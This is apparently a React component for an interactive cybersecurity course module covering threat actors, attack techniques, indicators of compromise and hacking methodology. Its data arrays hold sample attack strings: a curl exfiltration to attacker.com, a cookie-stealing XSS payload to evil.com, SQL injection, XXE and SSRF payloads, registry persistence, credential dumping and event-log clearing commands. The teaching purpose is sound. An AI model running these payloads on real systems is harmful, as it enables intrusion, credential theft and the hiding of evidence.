import React, { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { 
  Globe, DollarSign, Megaphone, UserX, Code, 
  Target, Crosshair, ChevronLeft, ChevronRight, 
  AlertTriangle, Shield, Check, Wifi
} from 'lucide-react';
import ProgressHexagon from '../../components/ProgressHexagon';

const InteractiveTerminal = ({ title, lines, textClass = "text-cyan-400" }) => {
  const [displayedLines, setDisplayedLines] = useState([]);
  const [currentCharIndex, setCurrentCharIndex] = useState(0);
  const [currentLineIndex, setCurrentLineIndex] = useState(0);

  useEffect(() => {
    if (currentLineIndex >= lines.length) return;

    const line = lines[currentLineIndex];
    if (currentCharIndex < line.length) {
      const timeout = setTimeout(() => {
        setDisplayedLines(prev => {
          const newLines = [...prev];
          if (!newLines[currentLineIndex]) newLines[currentLineIndex] = "";
          newLines[currentLineIndex] += line[currentCharIndex];
          return newLines;
        });
        setCurrentCharIndex(c => c + 1);
      }, 30); // fast typing
      return () => clearTimeout(timeout);
    } else {
      const timeout = setTimeout(() => {
        setCurrentLineIndex(l => l + 1);
        setCurrentCharIndex(0);
      }, 200);
      return () => clearTimeout(timeout);
    }
  }, [currentCharIndex, currentLineIndex, lines]);

  return (
    <div className="bg-slate-950 rounded-xl overflow-hidden border border-slate-800 w-full mb-4">
      <div className="bg-slate-900 border-b border-slate-800 px-4 py-3 flex items-center gap-1.5">
        <div className="w-3 h-3 rounded-full bg-cyan-500"></div>
        <div className="w-3 h-3 rounded-full bg-yellow-500"></div>
        <div className="w-3 h-3 rounded-full bg-green-500"></div>
        <span className="text-slate-500 text-xs ml-2 font-mono">{title}</span>
      </div>
      <div className="relative h-56 p-4 font-mono text-xs overflow-y-auto overflow-x-hidden [&::-webkit-scrollbar]:hidden [-ms-overflow-style:none] [scrollbar-width:none]">
        <div 
          className="absolute inset-0 pointer-events-none z-10" 
          style={{ 
            background: 'repeating-linear-gradient(transparent 0px, transparent 1px, rgba(0,0,0,0.18) 1px, rgba(0,0,0,0.18) 2px)', 
            backgroundSize: '2px 2px' 
          }} 
        />
        <div className={`relative z-0 ${textClass} whitespace-pre-wrap leading-relaxed`}>
          {displayedLines.map((l, i) => (
             <div key={i}>{l}</div>
          ))}
          {currentLineIndex < lines.length && (
            <motion.span 
               animate={{ opacity: [1, 0, 1] }} 
               transition={{ repeat: Infinity, duration: 0.8 }}
            >
              _
            </motion.span>
          )}
          {currentLineIndex >= lines.length && (
            <div>$ <motion.span animate={{ opacity: [1, 0, 1] }} transition={{ repeat: Infinity, duration: 0.8 }}>_</motion.span></div>
          )}
        </div>
      </div>
    </div>
  );
};

export default function CSAModule02() {
  const [completedSections, setCompletedSections] = useState(new Set());
  const [activeSection, setActiveSection] = useState(0);
  
  const [expandedThreat, setExpandedThreat] = useState(0);
  const [activeAttackTab, setActiveAttackTab] = useState(0);
  const [activeKillChainNode, setActiveKillChainNode] = useState(null);
  const [expandedVuln, setExpandedVuln] = useState(0);
  const [activeScenario, setActiveScenario] = useState(0);
  const [foundFlags, setFoundFlags] = useState(new Set());
  
  const [flipped, setFlipped] = useState([false, false, false]);
  const [searchQuery, setSearchQuery] = useState("");
  const [activeMethodPhase, setActiveMethodPhase] = useState(null);
  const [activePyramidLayer, setActivePyramidLayer] = useState(0);
  /* PART2_EFFECTS_AND_HOOKS */
  useEffect(() => {
    if (completedSections.size === 9) {
      try {
        const badges = JSON.parse(localStorage.getItem('csa_badges') || '[]');
        if (!badges.includes('Threat Analyst')) {
          badges.push('Threat Analyst');
          localStorage.setItem('csa_badges', JSON.stringify(badges));
        }
      } catch (e) {
        console.error("Local storage error", e);
      }
    }
  }, [completedSections.size]);

  const handleMarkComplete = (index) => {
    setCompletedSections(prev => {
      const next = new Set(prev);
      next.add(index);
      return next;
    });
  };
  const navItems = [
    "01-Cyber Threats", "02-Network TTPs", "03-Host TTPs", "04-App TTPs", 
    "05-Social Engineering", "06-Email Attacks", "07-Insider TTPs", 
    "08-IoCs", "09-Hacking Methodology"
  ];

  const threatActors = [
    { 
      icon: Globe, name: "Nation-State (APT)", motivation: "Espionage", 
      details: "Highly sophisticated groups backed by government intelligence agencies. Focus on long-term persistence, high-value intellectual property theft, and infrastructure disruption.",
      caseStudy: "SolarWinds Supply Chain (Cozy Bear / APT29), Stuxnet (Equation Group).",
      stats: { stealth: 95, resources: 100, skill: 95, scope: 60, speed: 40 }
    },
    { 
      icon: DollarSign, name: "Cybercriminal", motivation: "Financial", 
      details: "Organized syndicates operating like modern businesses (RaaS). Primary goals are direct monetization via ransomware, extortion, and trading zero-days.",
      caseStudy: "Colonial Pipeline Ransomware (DarkSide), MOVEit Transfer Exploitation (Cl0p).",
      stats: { stealth: 70, resources: 85, skill: 80, scope: 90, speed: 95 }
    },
    { 
      icon: Megaphone, name: "Hacktivist", motivation: "Ideology", 
      details: "Decentralized collectives leveraging cyber attacks to promote political agendas, human rights, or social disruption.",
      caseStudy: "Operation Payback (Anonymous), Sony Pictures Hack (Guardians of Peace).",
      stats: { stealth: 40, resources: 30, skill: 60, scope: 75, speed: 85 }
    },
    { 
      icon: UserX, name: "Insider Threat", motivation: "Revenge/Negligence", 
      details: "Current or former employees misusing legitimate access. Most difficult to detect as they bypass traditional perimeter defenses trivially.",
      caseStudy: "Waymo Trade Secrets Theft (Anthony Levandowski), Capital One AWS Breach.",
      stats: { stealth: 90, resources: 10, skill: 40, scope: 30, speed: 60 }
    },
    { 
      icon: Code, name: "Script Kiddie", motivation: "Notoriety", 
      details: "Novice attackers using readily available frameworks (Metasploit, LOIC) without understanding the core mechanics of the exploits.",
      caseStudy: "Mirai Botnet DDoS Attacks, WordPress CMS mass-defacement campaigns.",
      stats: { stealth: 10, resources: 10, skill: 15, scope: 85, speed: 70 }
    }
  ];

  const networkTabs = [
    { name: "Recon", full: "Reconnaissance", desc: "Passive and active information gathering about target networks before launching attacks.", techs: ["OSINT", "DNS Enumeration", "WHOIS Lookup"], tools: ["Shodan", "Maltego", "theHarvester", "Recon-ng"] },
    { name: "Scanning", full: "Network Scanning", desc: "Systematic probing of network hosts to discover open ports, services and vulnerabilities.", techs: ["Port Scanning", "Service Detection", "OS Fingerprinting"], tools: ["Nmap", "Masscan", "Nessus", "OpenVAS"] },
    { name: "Sniffing", full: "Packet Sniffing", desc: "Intercepting and analyzing network traffic to capture credentials and sensitive data.", techs: ["Promiscuous Mode", "ARP Poisoning", "MAC Flooding"], tools: ["Wireshark", "tcpdump", "Ettercap", "dSniff"] },
    { name: "Spoofing", full: "IP/ARP Spoofing", desc: "Forging source addresses to impersonate trusted hosts and bypass access controls.", techs: ["IP Spoofing", "ARP Spoofing", "DNS Spoofing"], tools: ["Scapy", "arpspoof", "hping3", "Yersinia"] },
    { name: "DoS/DDoS", full: "Denial of Service", desc: "Overwhelming target systems or networks to deny legitimate users access to resources.", techs: ["SYN Flood", "UDP Flood", "HTTP Flood", "Amplification"], tools: ["LOIC", "HOIC", "hping3", "Slowloris"] },
    { name: "MITM", full: "Man-in-the-Middle", desc: "Positioning between communicating parties to intercept, read and modify traffic in transit.", techs: ["SSL Stripping", "Session Hijacking", "BGP Hijacking"], tools: ["Bettercap", "mitmproxy", "SSLstrip", "Responder"] },
    { name: "DNS Poisoning", full: "DNS Cache Poisoning", desc: "Injecting forged DNS records to redirect users to malicious servers without their knowledge.", techs: ["Cache Poisoning", "DNS Hijacking", "BGP Route Injection"], tools: ["dnsspoof", "Metasploit", "dnschef", "MITMf"] }
  ];

  const hostNodes = [
    { label: "Initial Access", desc: "Techniques to gain first foothold in target environment.", subs: ["T1190 Exploit Public App", "T1566 Phishing", "T1078 Valid Accounts"], cmd: "msfconsole -q -x 'use exploit/multi/handler'" },
    { label: "Execution", desc: "Running attacker-controlled code on local or remote system.", subs: ["T1059 Command Scripting", "T1204 User Execution", "T1053 Scheduled Task"], cmd: "powershell.exe -enc [base64_payload]" },
    { label: "Persistence", desc: "Maintaining access across restarts and credential changes.", subs: ["T1547 Registry Run Keys", "T1053 Scheduled Tasks", "T1543 Services"], cmd: "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d C:\\malware.exe" },
    { label: "Priv Escalation", desc: "Gaining higher permissions than initially obtained.", subs: ["T1068 Exploit Vulnerability", "T1548 Abuse Elevation", "T1134 Token Impersonation"], cmd: "whoami /priv && exploit-suggester.py" },
    { label: "Defense Evasion", desc: "Avoiding detection by security tools and analysts.", subs: ["T1070 Indicator Removal", "T1027 Obfuscation", "T1562 Impair Defenses"], cmd: "wevtutil cl System && wevtutil cl Security" },
    { label: "Cred Access", desc: "Stealing credentials to access additional resources.", subs: ["T1003 OS Credential Dumping", "T1110 Brute Force", "T1555 Credentials from Stores"], cmd: "sekurlsa::logonpasswords" },
    { label: "Lateral Move", desc: "Moving through the environment to reach target systems.", subs: ["T1021 Remote Services", "T1550 Pass the Hash", "T1534 Internal Spearphishing"], cmd: "wmiexec.py domain/user:pass@192.168.1.50" },
    { label: "Exfiltration", desc: "Stealing and transferring data out of the target environment.", subs: ["T1041 C2 Channel Exfil", "T1048 Exfil Over Alt Protocol", "T1567 Exfil to Cloud"], cmd: "curl -X POST https://attacker.com/upload -F data=@stolen.zip" }
  ];

  const appVulns = [
    { name: "SQL Injection", sev: "Critical", desc: "Injecting malicious SQL code into queries to manipulate or extract database contents.", payload: "' OR 1=1 --\n' UNION SELECT username,password FROM users --\n'; DROP TABLE users; --", simUrl: "https://bank.local/login.php", simResp: "[SYSTEM COMPROMISE]\nAdmin session established via WAF bypass." },
    { name: "Cross-Site Scripting", sev: "High", desc: "Injecting client-side scripts into web pages viewed by other users to steal sessions.", payload: "<script>document.location='http://evil.com/steal?c='+document.cookie</script>\n<img src=x onerror=alert(document.domain)>", simUrl: "https://social.local/profile?user=<script>...", simResp: "[DATA EXFILTRATION]\nCookie 'session_id=X9Y2Z' successfully transmitted to C2 server." },
    { name: "CSRF", sev: "High", desc: "Tricking authenticated users into executing unwanted actions on trusted web applications.", payload: "<form action=\"https://bank.com/transfer\" method=\"POST\">\n  <input name=\"amount\" value=\"10000\">\n  <input name=\"to\" value=\"attacker\">\n</form>\n<script>document.forms[0].submit()</script>", simUrl: "https://attacker.com/free-iphone.html", simResp: "[STATE MUTATION]\n$10,000 silently transferred to account 'attacker_99'." },
    { name: "IDOR", sev: "High", desc: "Accessing unauthorized objects by manipulating reference parameters in requests.", payload: "GET /api/users/1337/profile → change to /api/users/1/profile\nGET /invoice?id=9823 → /invoice?id=1", simUrl: "https://health.local/records?patient_id=1", simResp: "[DATA BREACH]\nAccess granted to Patient ID 1 (CEO Medical Records)." },
    { name: "XXE Injection", sev: "High", desc: "Exploiting XML parsers to read local files or perform SSRF via external entity refs.", payload: "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<user><name>&xxe;</name></user>", simUrl: "https://api.local/upload-xml", simResp: "[FILE DISCLOSURE]\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin..." },
    { name: "SSRF", sev: "Critical", desc: "Forging server-side requests to access internal services not exposed to the internet.", payload: "GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\nGET /proxy?target=http://internal-api:8080/admin", simUrl: "https://app.local/webhook?target=http://169.254.169.254", simResp: "[PIVOT SUCCESS]\nAWS Temporary IAM Credentials recovered from internal metadata service." },
    { name: "Broken Auth", sev: "Critical", desc: "Exploiting weak authentication mechanisms to hijack sessions or bypass login controls.", payload: "POST /login {user:'admin', pass:'password123'}\nCookie: session=eyJhbGci... (No Signature)\nGET /reset?token=0000001", simUrl: "https://vpn.local/auth", simResp: "[ACCESS GRANTED]\nJWT Signature validation bypassed. Authenticated as 'admin'." }
  ];

  const socialScenarios = [
    { title: "Phishing", type: "Email-Based", desc: "Attacker sends fraudulent emails impersonating trusted entities to steal credentials or deliver malware via malicious links and attachments.", flags: ["Urgent language", "Mismatched sender domain", "Suspicious attachment"], defenses: ["Email filtering", "User awareness training", "MFA enforcement"] },
    { title: "Vishing", type: "Voice-Based", desc: "Attacker calls targets impersonating IT support, banks or government agencies to extract sensitive information over the phone.", flags: ["Unsolicited call", "Pressure to act fast", "Requests for credentials"], defenses: ["Callback verification", "Never share passwords", "Staff training"] },
    { title: "Smishing", type: "SMS-Based", desc: "Attacker sends malicious SMS messages with fake alerts and shortened URLs leading to credential harvesting pages.", flags: ["Unexpected SMS", "Shortened URLs", "Prize or threat lure"], defenses: ["Never click SMS links", "Verify via official app", "Report suspicious texts"] },
    { title: "Baiting", type: "Media-Based", desc: "Attacker leaves infected USB drives or media in physical locations hoping curious employees will plug them into corporate systems.", flags: ["Found USB device", "Enticing label", "No clear owner"], defenses: ["USB port blocking", "Security policy", "Device scanning"] },
    { title: "Pretexting", type: "Identity-Based", desc: "Attacker fabricates a convincing backstory and persona to manipulate targets into revealing information or granting access.", flags: ["Too much detail", "Unusual request", "Cannot verify identity"], defenses: ["Identity verification", "Need-to-know policy", "Manager escalation"] },
    { title: "Tailgating", type: "Physical-Based", desc: "Attacker follows authorized personnel through secure access points without proper authentication by exploiting social courtesy.", flags: ["Unknown person close behind", "No badge", "Hands full excuse"], defenses: ["Badge-in policy", "Mantrap doors", "Security awareness"] }
  ];

  const insiderCards = [
    { icon: UserX, color: "text-cyan-400", title: "Malicious Insider", desc: "Current or former employee intentionally causing harm for personal gain, revenge or espionage.", ind: ["Accessing data outside job role", "Downloading large volumes of files", "Working at unusual hours"], det: "DLP alerts on mass download, UEBA behavioral baseline deviation" },
    { icon: AlertTriangle, color: "text-blue-400", title: "Negligent Insider", desc: "Employee who unintentionally causes security incidents through carelessness, poor hygiene or lack of training.", ind: ["Clicking phishing links", "Using weak passwords", "Shadow IT adoption"], det: "Phishing simulation failure rates, Password audit findings" },
    { icon: Wifi, color: "text-blue-400", title: "Compromised Insider", desc: "Legitimate employee whose credentials or device have been taken over by an external threat actor.", ind: ["Login from unusual geolocation", "Impossible travel alerts", "Credential used at odd hours"], det: "Impossible travel SIEM rule, MFA challenge failures, C2 beacon" }
  ];

  const iocRows = [
    { type: "File Hash", ex: "d41d8cd98f00b204e9800...", ctx: "MD5/SHA256 hash of malware", sev: "Critical" },
    { type: "IP Address", ex: "185.220.101.47", ctx: "Command and Control server", sev: "Critical" },
    { type: "Domain", ex: "paypa1-secure.verify.ru", ctx: "Phishing delivery domain", sev: "High" },
    { type: "URL", ex: "http://evil.com/payload.ps1", ctx: "Malicious payload URL", sev: "High" },
    { type: "Registry Key", ex: "HKCU\\Software\\...\\Run\\Updater", ctx: "Persistence mechanism registry", sev: "High" },
    { type: "Mutex", ex: "Global\\MicrosoftUpdateHelper_v2", ctx: "Malware instance lock", sev: "Medium" },
    { type: "User-Agent", ex: "sqlmap/1.7.8#stable", ctx: "Automated attack tool agent", sev: "Medium" }
  ];

  const methodPhases = [
    { label: "01 — Reconnaissance", desc: "Gathering information about target without direct interaction (passive) or with interaction (active).", tools: ["Shodan", "Maltego", "theHarvester", "Recon-ng", "Google Dorks"], techs: ["Passive OSINT", "DNS Enumeration", "Social Media Profiling"], cmd: "$ theHarvester -d target.com -b google\n> Emails found: admin@target.com\n> Hosts found: mail.target.com, vpn.target.com" },
    { label: "02 — Scanning & Enum", desc: "Probing the target to discover open ports, running services, OS details and potential vulnerabilities.", tools: ["Nmap", "Nessus", "Masscan", "OpenVAS", "Nikto"], techs: ["Port Scanning", "Service Detection", "Vuln Scanning"], cmd: "$ nmap -sS -sV -O -A --script=vuln target.com\n> 22/tcp open ssh OpenSSH 8.2\n> 80/tcp open http Apache 2.4.41 [VULN: CVE-41773]\n> 3306/tcp open mysql MySQL 5.7.32" },
    { label: "03 — Gaining Access", desc: "Exploiting discovered vulnerabilities to achieve initial foothold on the target system.", tools: ["Metasploit", "SQLmap", "Hydra", "Burp Suite", "BeEF"], techs: ["Exploitation", "Password Attacks", "Social Engineering"], cmd: "$ msfconsole\nmsf6> use exploit/unix/webapp/wp_admin_shell_upload\nmsf6> set RHOSTS target.com\nmsf6> run\n[*] Meterpreter session 1 opened" },
    { label: "04 — Maintain Access", desc: "Installing backdoors and rootkits to ensure persistent access even after system reboots or password changes.", tools: ["Netcat", "Cobalt Strike", "Metasploit", "Custom RATs"], techs: ["Backdoors", "Rootkits", "Persistence Mechanisms"], cmd: "$ reg add HKCU\\Software\\Microsoft\\Windows\\...\\Run\n/v Updater /d 'C:\\Users\\Public\\svchost.exe' /f\n> [SUCCESS] Persistence established" },
    { label: "05 — Clearing Tracks", desc: "Removing evidence of the intrusion to avoid detection and maintain deniability about the attack.", tools: ["wevtutil", "Timestomp", "BleachBit", "Metasploit Clearev"], techs: ["Log Deletion", "Timestamp Manipulation", "Anti-forensics"], cmd: "$ wevtutil cl System\n$ wevtutil cl Security\n$ wevtutil cl Application\n> [DONE] Event logs cleared — 3,847 entries removed\n$ timestomp malware.exe -z" }
  ];

  const getRadarPoints = (stats, scale = 1) => {
    if (!stats) return "";
    const keys = ['stealth', 'resources', 'skill', 'scope', 'speed'];
    return keys.map((key, i) => {
      const angle = (Math.PI * 2 * i) / 5 - Math.PI / 2;
      const r = (stats[key] / 100) * 80 * scale;
      return `${100 + r * Math.cos(angle)},${100 + r * Math.sin(angle)}`;
    }).join(' ');
  };

  const getRadarAxis = () => {
    return Array.from({length: 5}).map((_, i) => {
      const angle = (Math.PI * 2 * i) / 5 - Math.PI / 2;
      return { x2: 100 + 80 * Math.cos(angle), y2: 100 + 80 * Math.sin(angle) };
    });
  };

  const MarkCompleteBtn = ({ index }) => {
    const isComplete = completedSections.has(index);
    return (
      <div className="flex justify-end mt-6">
        <AnimatePresence mode="wait">
          {!isComplete ? (
            <motion.button 
              key="inc"
              initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
              onClick={() => handleMarkComplete(index)}
              className="border border-cyan-400 text-cyan-400 text-xs px-4 py-2 rounded-lg hover:bg-cyan-400/10 transition-colors"
            >
              Mark Complete
            </motion.button>
          ) : (
            <motion.button 
              key="com"
              initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
              className="bg-cyan-400 text-black text-xs px-4 py-2 rounded-lg flex items-center gap-2 cursor-default"
            >
              <Check size={14} /> Completed
            </motion.button>
          )}
        </AnimatePresence>
      </div>
    );
  };

  return (
    <div className="min-h-screen bg-black font-sans selection:bg-cyan-400/30 selection:text-cyan-400">
      
      {/* Progress Hexagon */}
      <ProgressHexagon current={completedSections.size} total={9} />

      {/* Badge Overlay */}
      <AnimatePresence>
        {completedSections.size === 9 && (
          <motion.div 
            initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black/80 backdrop-blur-sm z-[60] flex items-center justify-center p-4"
          >
            <motion.div 
              initial={{ scale: 0, opacity: 0 }} 
              animate={{ scale: 1, opacity: 1 }} 
              transition={{ type: "spring", stiffness: 200, damping: 20 }}
              className="bg-slate-900 border border-cyan-400 rounded-2xl p-8 relative flex flex-col items-center text-center shadow-[0_0_40px_rgba(34,211,238,0.3)] max-w-sm w-full"
            >
              {[...Array(12)].map((_, i) => (
                <motion.div
                  key={i}
                  className="absolute left-1/2 top-1/2 w-2 h-2 rounded-full bg-cyan-400"
                  initial={{ x: 0, y: 0, opacity: 1 }}
                  animate={{ 
                    x: Math.cos(i * 30 * Math.PI / 180) * 120, 
                    y: Math.sin(i * 30 * Math.PI / 180) * 120, 
                    opacity: 0 
                  }}
                  transition={{ duration: 0.8, delay: i * 0.5 * (1/12), ease: "easeOut" }}
                />
              ))}
              <Crosshair size={48} className="text-cyan-400 mb-4" />
              <h2 className="text-3xl font-bold text-cyan-400 mb-1">Threat Analyst</h2>
              <p className="text-slate-400 mb-6">Badge Earned</p>
              <button 
                onClick={() => setCompletedSections(new Set())} 
                className="text-slate-600 hover:text-cyan-400 transition-colors text-sm"
              >
                Close Visual
              </button>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      <div className="max-w-6xl mx-auto relative">
        {/* Header Segment */}
      <div className="mb-6 sm:mb-10 w-full px-4 sm:px-6 pt-8 sm:pt-12">
        <h3 className="text-sm text-cyan-400 font-mono mb-1">Module 02</h3>
        <h1 className="text-2xl sm:text-4xl font-bold text-slate-100 tracking-tight leading-tight mb-2 max-w-4xl">Understanding Cyber Threats & Attack Methodology</h1>
        <p className="text-slate-500 text-sm sm:text-lg max-w-3xl">Explore the threat landscape, analyze indicators of compromise, and trace the modern hacking methodology.</p>
      </div>
        {/* Horizontal Section Navigator */}
        <div className="flex flex-row overflow-x-auto pb-3 sm:pb-4 gap-1.5 sm:gap-2 border-b border-slate-800 mb-8 sm:mb-12 w-full sticky top-[64px] sm:top-[80px] bg-black/80 backdrop-blur-md z-50 px-4 sm:px-6 [-ms-overflow-style:none] [scrollbar-width:none] [&::-webkit-scrollbar]:hidden">
          {navItems.map((item, idx) => {
            const isActive = activeSection === idx;
            const isCompleted = completedSections.has(idx);
            return (
              <button
                key={idx}
                onClick={() => setActiveSection(idx)}
                className={`shrink-0 relative px-3 sm:px-5 py-3 rounded-lg text-xs sm:text-sm font-semibold transition-colors flex items-center gap-2 ${isActive ? 'text-cyan-400 bg-cyan-400/10 border border-cyan-400/20' : 'text-slate-400 bg-slate-900 hover:text-slate-200 hover:bg-slate-800 box-border border-transparent'}`}
              >
                {isActive && (
                  <motion.div layoutId="m2ActiveSectionUnderline" className="absolute inset-x-0 -bottom-[15px] sm:-bottom-[19px] h-[2px] bg-cyan-400" />
                )}
                <span>{item.split('-').length > 1 ? item.split('-')[1] : item}</span>
                {isCompleted && <Check size={14} className={isActive ? "text-cyan-400" : "text-slate-500"} />}
              </button>
            );
          })}
        </div>

        {/* Main Content Area */}

        <div className="min-h-[600px] w-full relative z-10">
          <AnimatePresence mode="wait">
        {/* SECTION 1 */}
        {activeSection === 0 && (
              <motion.div
                key={0}
                initial={{ opacity: 0, y: 15 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -15 }}
                transition={{ duration: 0.3 }}
                className="mb-10"
              >
          <motion.h2 
            initial={{ opacity: 0, y: 20 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true }}
            className="text-2xl font-bold text-slate-100 mb-2"
          >
            Cyber Threats and Their Impact on Cybersecurity
          </motion.h2>
          <p className="text-sm text-slate-500 mb-6">Understanding the threat landscape and actors</p>

          <div className="flex flex-col lg:flex-row gap-6 mb-8">
            {/* Left Box: Actor Selection */}
            <div className="w-full lg:w-1/3 flex flex-col gap-3">
              {threatActors.map((actor, idx) => {
                const isSelected = expandedThreat === idx;
                return (
                 <motion.div
                   key={idx}
                   initial={{ opacity: 0, x: -20 }} whileInView={{ opacity: 1, x: 0 }} viewport={{ once: true }}
                   transition={{ type: "spring", delay: idx * 0.08 }}
                   onClick={() => setExpandedThreat(idx)}
                   className={`bg-slate-900 border rounded-xl p-4 cursor-pointer transition-colors flex items-center gap-4 ${isSelected ? 'border-cyan-400/80 shadow-[0_0_15px_rgba(34,211,238,0.15)] bg-cyan-400/5' : 'border-slate-800 hover:border-cyan-400/50'}`}
                 >
                   <div className={`p-2 rounded-lg ${isSelected ? 'bg-cyan-400/20 text-cyan-400' : 'bg-slate-800 text-slate-400'}`}>
                     <actor.icon size={24} />
                   </div>
                   <div>
                     <h4 className="text-sm font-bold text-slate-100">{actor.name}</h4>
                     <span className="text-[10px] text-slate-500 uppercase tracking-widest">{actor.motivation}</span>
                   </div>
                 </motion.div>
                );
              })}
            </div>

            {/* Right Box: Radar Chart & Details */}
            <div className="w-full lg:w-2/3 bg-slate-900 border border-slate-800 rounded-xl p-6 relative overflow-hidden flex flex-col md:flex-row gap-6 items-center min-h-[350px]">
              {expandedThreat !== null ? (
                <AnimatePresence mode="wait">
                  <motion.div
                    key={expandedThreat}
                    initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} exit={{ opacity: 0, scale: 0.95 }}
                    className="w-full h-full flex flex-col md:flex-row gap-6 items-center"
                  >
                    {/* SVG Radar */}
                    <div className="w-full md:w-1/2 flex justify-center items-center">
                      <svg viewBox="0 0 200 220" className="w-[200px] h-[220px] overflow-visible">
                        <defs>
                          <filter id="radarGlow">
                            <feGaussianBlur stdDeviation="3" result="blur" />
                            <feComposite in="SourceGraphic" in2="blur" operator="over" />
                          </filter>
                        </defs>
                        {/* Background Web */}
                        <g stroke="#3f3f46" strokeWidth="1" opacity="0.5">
                           {[0.2, 0.4, 0.6, 0.8, 1].map(scale => (
                             <polygon key={scale} points={getRadarPoints({stealth:100,resources:100,skill:100,scope:100,speed:100}, scale)} fill="none" />
                           ))}
                           {getRadarAxis().map((line, i) => (
                             <line key={i} x1="100" y1="100" x2={line.x2} y2={line.y2} />
                           ))}
                        </g>
                        {/* Data Polygon */}
                        <motion.polygon 
                          points={getRadarPoints(threatActors[expandedThreat].stats, 1)}
                          fill="rgba(34, 211, 238, 0.2)"
                          stroke="#22d3ee"
                          strokeWidth="2"
                          filter="url(#radarGlow)"
                          initial={{ pathLength: 0, opacity: 0 }}
                          animate={{ pathLength: 1, opacity: 1 }}
                          transition={{ duration: 0.8, ease: "easeOut" }}
                        />
                        {/* Labels */}
                        <text x="100" y="10" fontSize="8" fill="#a1a1aa" textAnchor="middle">Stealth</text>
                        <text x="195" y="80" fontSize="8" fill="#a1a1aa" textAnchor="end">Resources</text>
                        <text x="175" y="195" fontSize="8" fill="#a1a1aa" textAnchor="end">Skill</text>
                        <text x="25" y="195" fontSize="8" fill="#a1a1aa" textAnchor="start">Scope</text>
                        <text x="5" y="80" fontSize="8" fill="#a1a1aa" textAnchor="start">Speed</text>
                      </svg>
                    </div>
                    {/* Details */}
                    <div className="w-full md:w-1/2 flex flex-col justify-center gap-4">
                      <div>
                        <h3 className="text-xl font-bold text-cyan-400 mb-2">{threatActors[expandedThreat].name}</h3>
                        <p className="text-sm text-slate-300 leading-relaxed mb-4">{threatActors[expandedThreat].details}</p>
                      </div>
                      <div className="bg-slate-950 border border-slate-800 rounded p-3 relative overflow-hidden">
                        <div className="absolute inset-0 pointer-events-none z-10 opacity-50" style={{ background: 'repeating-linear-gradient(transparent 0px, transparent 1px, rgba(0,0,0,0.18) 1px, rgba(0,0,0,0.18) 2px)', backgroundSize: '100% 2px' }} />
                        <span className="block text-[10px] text-slate-500 uppercase tracking-widest mb-1 relative z-20">Known Campaigns</span>
                        <span className="text-xs text-slate-400 font-mono relative z-20">{threatActors[expandedThreat].caseStudy}</span>
                      </div>
                    </div>
                  </motion.div>
                </AnimatePresence>
              ) : null}
            </div>
          </div>

          <div className="mt-6 w-full overflow-x-auto [&::-webkit-scrollbar]:hidden [-ms-overflow-style:none] [scrollbar-width:none]">
            <svg viewBox="0 0 600 100" className="min-w-[500px] w-full">
              <text x="300" y="20" fontSize="11" fill="#a1a1aa" textAnchor="middle">Threat Actor Impact Severity Scale</text>
              <rect x="20" y="35" width="560" height="30" rx="15" fill="#27272a" />
              <rect x="20" y="35" width="112" height="30" rx="15" fill="#3f3f46" />
              <rect x="132" y="35" width="112" height="30" fill="#713f12" />
              <rect x="244" y="35" width="112" height="30" fill="#92400e" />
              <rect x="356" y="35" width="112" height="30" fill="#c2410c" />
              <rect x="468" y="35" width="112" height="30" rx="15" fill="#22d3ee" clipPath="inset(0 0 0 0 round 0 15px 15px 0)" />
              <text x="76" y="80" fontSize="9" fill="#71717a" textAnchor="middle">Minimal</text>
              <text x="188" y="80" fontSize="9" fill="#71717a" textAnchor="middle">Low</text>
              <text x="300" y="80" fontSize="9" fill="#71717a" textAnchor="middle">Medium</text>
              <text x="412" y="80" fontSize="9" fill="#71717a" textAnchor="middle">High</text>
              <text x="524" y="80" fontSize="9" fill="#71717a" textAnchor="middle">Critical</text>
              <motion.path 
                 d="M 20 35 L 30 25 L 10 25 Z" fill="#22d3ee"
                 initial={{ x: 0 }}
                 whileInView={{ x: 504 }}
                 transition={{ duration: 1.5, ease: "easeOut" }}
                 viewport={{ once: true }}
              />
            </svg>
          </div>
          <MarkCompleteBtn index={0} />
              </motion.div>
            )}

        {/* SECTION 2 */}
        {activeSection === 1 && (
              <motion.div
                key={1}
                initial={{ opacity: 0, y: 15 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -15 }}
                transition={{ duration: 0.3 }}
                className="mb-10"
              >
          <motion.h2 
            initial={{ opacity: 0, y: 20 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true }}
            className="text-2xl font-bold text-slate-100 mb-2"
          >
            Network Attack Tactics, Techniques, and Procedures
          </motion.h2>
          <p className="text-sm text-slate-500 mb-4">TTPs used by attackers targeting network infrastructure</p>

          <InteractiveTerminal 
            title="net-attack-sim — bash" 
            lines={[
              "$ analyze --network-attacks\n", 
              "> [RECON] Passive fingerprinting via Shodan/Censys OSINT sources\n", 
              "> [SCAN] nmap -sS -sV -O --script=vuln 192.168.1.0/24\n", 
              "> [SNIFF] Wireshark capture on eth0 — ARP poisoning detected on LAN\n", 
              "> [SPOOF] IP spoofing via raw socket crafting — bypassing ACLs\n", 
              "> [DoS] SYN flood: 50,000 packets/sec detected on port 443\n", 
              "> [MITM] SSL stripping attack intercepting HTTPS on default gateway\n", 
              "> [DNS] Cache poisoning — forged A record injected for bank.com\n"
            ]} 
          />

          <div className="flex flex-wrap gap-2 mt-4 mb-3">
            {networkTabs.map((tab, idx) => (
              <button
                key={idx}
                onClick={() => setActiveAttackTab(idx)}
